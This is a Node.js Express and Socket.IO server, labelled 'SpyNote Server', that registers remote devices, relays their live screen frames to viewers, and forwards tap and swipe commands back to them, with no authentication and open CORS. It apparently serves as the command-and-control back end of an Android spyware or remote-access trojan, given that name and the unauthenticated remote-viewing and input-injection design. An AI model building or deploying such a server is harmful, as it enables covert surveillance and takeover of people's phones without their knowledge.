const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 500 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log(`📱 Device registered: ${deviceId}`);
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            // 🔥 Ultra smooth - Send to all clients watching this device
            socket.to(deviceId).emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp,
                layout: data.layout || [], // 🔥 Always send layout
                fps: data.fps
            });
        }
    });

    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x),
                y: parseFloat(y),
                startX: parseFloat(startX),
                startY: parseFloat(startY),
                endX: parseFloat(endX),
                endY: parseFloat(endY),
                duration: parseInt(duration) || 300
            });
            console.log(`🎮 Control ${action} on ${deviceId}`);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log(`📴 Device disconnected: ${deviceId}`);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server running on port ${PORT}!`);
});
